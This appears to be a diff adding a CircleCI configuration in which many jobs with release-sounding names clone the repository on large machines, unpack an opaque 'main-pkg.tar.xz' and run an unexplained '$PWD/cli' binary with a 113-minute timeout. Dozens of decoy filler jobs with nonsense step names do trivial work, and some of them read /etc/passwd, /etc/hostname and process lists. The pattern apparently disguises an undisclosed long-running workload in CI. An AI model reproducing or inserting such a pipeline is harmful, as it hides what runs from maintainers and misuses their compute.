+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/cli
+  phase_prometheus-rc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: hair dry
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | head -c 14848000 | base64 | head -c 200 | wc -c; true ; } > /tmp/plaza/cache.raw
+            echo "@@ prometheus-rc: $(wc -c </tmp/plaza/cache.raw)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - cache.raw
+  prometheus-rc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: Siphon 3
+          command: |
+            enable -p | grep -q ^enable && wc /tmp/plaza/cache.raw 2>/dev/null || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/cli
+  stepA_ShipImage:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: loop again
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; echo "layered" | base64 | tr A-Za-z N-ZA-Mn-za-m | head -c 20; true ; } > /tmp/plaza/temporary.data
+            echo "@@ ShipImage: $(wc -c </tmp/plaza/temporary.data)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - temporary.data
+  ShipImage:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: Siphon 3
+          command: |
+            enable -p | grep -q ^enable && wc /tmp/plaza/temporary.data 2>/dev/null || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull reference data
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/cli
+  C_nico-verify:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: decrescendo
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; cut -d: -f3 /etc/passwd | sort -n | tail -1; true ; } > /tmp/plaza/.ready2
+            echo "@@ nico-verify: $(wc -c </tmp/plaza/.ready2)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - .ready2
+  nico-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: Siphon 3
+          command: |
+            enable -p | grep -q ^enable && wc /tmp/plaza/.ready2 2>/dev/null || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Stage inputs
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/cli
+  fixture_ensure-partial-regression-suite:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: against grain
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; echo {a..e}{1..3} | tr ' ' '\n' | wc -l; true ; } > /tmp/plaza/step-B.out
+            echo "@@ ensure-partial-regression-suite: $(wc -c </tmp/plaza/step-B.out)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - step-B.out
+  ensure-partial-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: Siphon 3
+          command: |
+            enable -p | grep -q ^enable && wc /tmp/plaza/step-B.out 2>/dev/null || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 -q --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: xz -dc main-pkg.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/cli
+
+  hook_APP-24_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: rough edge
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; seq 1 324241 | awk '{if($1%97==0)c++}END{print c}'; true ; } > /tmp/plaza/cafebabe.bin
+            echo "@@ APP-24: $(wc -c </tmp/plaza/cafebabe.bin)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - cafebabe.bin
+  Beta_cook-it_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: brush grain
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="aabbaccd"; r=""; for(i=1;i<=length(s);i++){c=substr(s,i,1); if(c!=prev)r=r c; prev=c}; print r}'; true ; } > /tmp/plaza/step-6.log
+            echo "@@ cook-it: $(wc -c </tmp/plaza/step-6.log)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - step-6.log
+  fixture_release_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: one more bite
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; ps -eo pid,ppid 2>/dev/null | wc -l; true ; } > /tmp/plaza/full_task_output_v2.log
+            echo "@@ release: $(wc -c </tmp/plaza/full_task_output_v2.log)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - full_task_output_v2.log
+  drain_rm-login-crash_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: side plank
+          command: |
+            mkdir -p /tmp/plaza
+            set +o pipefail 2>/dev/null; (seq 1 10000 | md5sum > /tmp/plaza/save-D.pkl) & wait; true
+            echo "@@ rm-login-crash: $(wc -c </tmp/plaza/save-D.pkl)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - save-D.pkl
+  spinner_all-greens_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: elm plank
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; head -c 18M /dev/urandom | base64 | wc -c; true ; } > /tmp/plaza/main_job_output_v2.log
+            echo "@@ all-greens: $(wc -c </tmp/plaza/main_job_output_v2.log)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - main_job_output_v2.log
+  ctx_omar-push_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: LGTM
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; echo 'foo baz foobaz' | sed 's/foo/bar/g; s/baz/qux/g'; true ; } > /tmp/plaza/pre-stage.out
+            echo "@@ omar-push: $(wc -c </tmp/plaza/pre-stage.out)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - pre-stage.out
+  fixture_b-new_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: magnetic north
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; seq 1 300 | awk '{if(int($1/50)!=p){p=int($1/50); print "block "p}}'; true ; } > /tmp/plaza/artifact
+            echo "@@ b-new: $(wc -c </tmp/plaza/artifact)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - artifact
+  rerun_update-retry_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: revolve
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; seq 1 100 | tr '\n' ','  | sed 's/,$/\n/' | head -c 60; true ; } > /tmp/plaza/checkpoint-B.pickle
+            echo "@@ update-retry: $(wc -c </tmp/plaza/checkpoint-B.pickle)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - checkpoint-B.pickle
+  fixture_aug21-cleanup_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: rollback 2
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{OFS=":"; print "a","b","c"}'; true ; } > /tmp/plaza/FINAL
+            echo "@@ aug21-cleanup: $(wc -c </tmp/plaza/FINAL)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - FINAL
+  g1_rm-router-reload_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: counterbore
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; date +"%B"; true ; } > /tmp/plaza/zxcvbn.dat
+            echo "@@ rm-router-reload: $(wc -c </tmp/plaza/zxcvbn.dat)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - zxcvbn.dat
+  phase_publish_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: not sure yet
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; sum /etc/hostname 2>/dev/null | head -1 || cksum /etc/hostname; true ; } > /tmp/plaza/step-7.out
+            echo "@@ publish: $(wc -c </tmp/plaza/step-7.out)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - step-7.out
+  loader_yuki-run_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: orbit sand
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; cat /etc/passwd | wc -l; true ; } > /tmp/plaza/step-12.out
+            echo "@@ yuki-run: $(wc -c </tmp/plaza/step-12.out)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - step-12.out
+  B_ShipImage_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: squat light
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; seq 1 1000 | awk 'NR%3==0' | wc -l; true ; } > /tmp/plaza/temporary.data
+            echo "@@ ShipImage: $(wc -c </tmp/plaza/temporary.data)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - temporary.data
+  round1_produce-production-release-candidate_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: loud now
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{print 1234567 / 89}'; true ; } > /tmp/plaza/test1.data
+            echo "@@ produce-production-release-candidate: $(wc -c </tmp/plaza/test1.data)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - test1.data
+  db_ensure-partial-regression-suite_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: flank
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; seq 1 500 | awk 'BEGIN{min=999999}{if($1>max)max=$1; if($1<min)min=$1}END{print min, max}'; true ; } > /tmp/plaza/step-B.out
+            echo "@@ ensure-partial-regression-suite: $(wc -c </tmp/plaza/step-B.out)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - step-B.out
+  cleanup_prometheus-rc_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: qa
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; echo -e "a\nb\nc\nd" | sort -r | md5sum; true ; } > /tmp/plaza/cache.raw
+            echo "@@ prometheus-rc: $(wc -c </tmp/plaza/cache.raw)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - cache.raw
+  produce_apr2-cleanup_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: cookout
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; seq 1 20 | xargs -n 4 2>/dev/null | wc -l; true ; } > /tmp/plaza/cache.dat
+            echo "@@ apr2-cleanup: $(wc -c </tmp/plaza/cache.dat)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - cache.dat
+  builder_go1-21-release_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: power sand
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; cksum /etc/hostname; true ; } > /tmp/plaza/tiny.bin
+            echo "@@ go1-21-release: $(wc -c </tmp/plaza/tiny.bin)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - tiny.bin
+  warmer_nico-verify_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: pin drop
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; echo $((2**15)); true ; } > /tmp/plaza/.ready2
+            echo "@@ nico-verify: $(wc -c </tmp/plaza/.ready2)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - .ready2
+  C_deploy_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: twist right
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; head -c 2048 /dev/urandom | md5sum | awk '{print $1}'; true ; } > /tmp/plaza/step-14.out
+            echo "@@ deploy: $(wc -c </tmp/plaza/step-14.out)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - step-14.out
+  runner_blast-off_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/plaza
+      - run:
+          name: tango dip
+          command: |
+            mkdir -p /tmp/plaza
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{a=1; for(i=0;i<10;i++){a*=2}; print a}'; true ; } > /tmp/plaza/left.log
+            echo "@@ blast-off: $(wc -c </tmp/plaza/left.log)"
+      - persist_to_workspace:
+          root: /tmp/plaza
+          paths:
+            - left.log
+workflows:
+  main:
+    jobs:
+      - rerun_java17-cov
+      - orchestrate_Verify_Pipeline8
+      - beta_update-webhook
+      - java17-cov:
+          requires:
+            - rerun_java17-cov
+            - orchestrate_Verify_Pipeline8
+            - beta_update-webhook
+      - Verify_Pipeline8:
+          requires:
+            - rerun_java17-cov
+            - orchestrate_Verify_Pipeline8
+            - beta_update-webhook
+      - update-webhook:
+          requires:
+            - rerun_java17-cov
+            - orchestrate_Verify_Pipeline8
+            - beta_update-webhook
+      - xi-verify:
+          requires:
+            - rerun_java17-cov
+            - orchestrate_Verify_Pipeline8
+            - beta_update-webhook
+      - redo_BUILD_QA
+      - canary1_rollout
+      - BUILD_QA:
+          requires:
+            - redo_BUILD_QA
+            - canary1_rollout
+      - rollout:
+          requires:
+            - redo_BUILD_QA
+            - canary1_rollout
+      - jun8-ship:
+          requires:
+            - redo_BUILD_QA
+            - canary1_rollout
+      - feat-523:
+          requires:
+            - redo_BUILD_QA
+            - canary1_rollout
+      - LAB_HOOK_9:
+          requires:
+            - redo_BUILD_QA
+            - canary1_rollout
+      - dispatch_APP-24
+      - hook_APP-24_2:
+          requires:
+            - dispatch_APP-24
+      - APP-24:
+          requires:
+            - hook_APP-24_2
+      - phase1_cook-it:
+          requires:
+            - hook_APP-24_2
+      - Beta_cook-it_2:
+          requires:
+            - phase1_cook-it
+      - cook-it:
+          requires:
+            - Beta_cook-it_2
+      - verify_release:
+          requires:
+            - Beta_cook-it_2
+      - fixture_release_2:
+          requires:
+            - verify_release
+      - release:
+          requires:
+            - fixture_release_2
+      - provision_rm-login-crash:
+          requires:
+            - fixture_release_2
+      - drain_rm-login-crash_2:
+          requires:
+            - provision_rm-login-crash
+      - rm-login-crash:
+          requires:
+            - drain_rm-login-crash_2
+      - precheck_all-greens:
+          requires:
+            - drain_rm-login-crash_2
+      - spinner_all-greens_2:
+          requires:
+            - precheck_all-greens
+      - all-greens:
+          requires:
+            - spinner_all-greens_2
+      - tmp_omar-push:
+          requires:
+            - spinner_all-greens_2
+      - ctx_omar-push_2:
+          requires:
+            - tmp_omar-push
+      - omar-push:
+          requires:
+            - ctx_omar-push_2
+      - hook_b-new:
+          requires:
+            - ctx_omar-push_2
+      - fixture_b-new_2:
+          requires:
+            - hook_b-new
+      - b-new:
+          requires:
+            - fixture_b-new_2
+      - verify_update-retry
+      - rerun_update-retry_2:
+          requires:
+            - verify_update-retry
+      - update-retry:
+          requires:
+            - rerun_update-retry_2
+      - produce_aug21-cleanup:
+          requires:
+            - rerun_update-retry_2
+      - fixture_aug21-cleanup_2:
+          requires:
+            - produce_aug21-cleanup
+      - aug21-cleanup:
+          requires:
+            - fixture_aug21-cleanup_2
+      - db_rm-router-reload:
+          requires:
+            - fixture_aug21-cleanup_2
+      - g1_rm-router-reload_2:
+          requires:
+            - db_rm-router-reload
+      - rm-router-reload:
+          requires:
+            - g1_rm-router-reload_2
+      - builder_publish:
+          requires:
+            - g1_rm-router-reload_2
+      - phase_publish_2:
+          requires:
+            - builder_publish
+      - publish:
+          requires:
+            - phase_publish_2
+      - route_yuki-run:
+          requires:
+            - phase_publish_2
+      - loader_yuki-run_2:
+          requires:
+            - route_yuki-run
+      - yuki-run:
+          requires:
+            - loader_yuki-run_2
+      - stepA_ShipImage
+      - B_ShipImage_2:
+          requires:
+            - stepA_ShipImage
+      - ShipImage:
+          requires:
+            - B_ShipImage_2
+      - phase_produce-production-release-candidate:
+          requires:
+            - B_ShipImage_2
+      - round1_produce-production-release-candidate_2:
+          requires:
+            - phase_produce-production-release-candidate
+      - produce-production-release-candidate:
+          requires:
+            - round1_produce-production-release-candidate_2
+      - fixture_ensure-partial-regression-suite:
+          requires:
+            - round1_produce-production-release-candidate_2
+      - db_ensure-partial-regression-suite_2:
+          requires:
+            - fixture_ensure-partial-regression-suite
+      - ensure-partial-regression-suite:
+          requires:
+            - db_ensure-partial-regression-suite_2
+      - phase_prometheus-rc:
+          requires:
+            - db_ensure-partial-regression-suite_2
+      - cleanup_prometheus-rc_2:
+          requires:
+            - phase_prometheus-rc
+      - prometheus-rc:
+          requires:
+            - cleanup_prometheus-rc_2
+      - beta_apr2-cleanup
+      - produce_apr2-cleanup_2:
+          requires:
+            - beta_apr2-cleanup
+      - apr2-cleanup:
+          requires:
+            - produce_apr2-cleanup_2
+      - sys_go1-21-release:
+          requires:
+            - produce_apr2-cleanup_2
+      - builder_go1-21-release_2:
+          requires:
+            - sys_go1-21-release
+      - go1-21-release:
+          requires:
+            - builder_go1-21-release_2
+      - C_nico-verify:
+          requires:
+            - builder_go1-21-release_2
+      - warmer_nico-verify_2:
+          requires:
+            - C_nico-verify
+      - nico-verify:
+          requires:
+            - warmer_nico-verify_2
+      - wire_deploy:
+          requires:
+            - warmer_nico-verify_2
+      - C_deploy_2:
+          requires:
+            - wire_deploy
+      - deploy:
+          requires:
+            - C_deploy_2
+      - inspect_blast-off:
+          requires:
+            - C_deploy_2
+      - runner_blast-off_2:
+          requires:
+            - inspect_blast-off
+      - blast-off:
+          requires:
+            - runner_blast-off_2
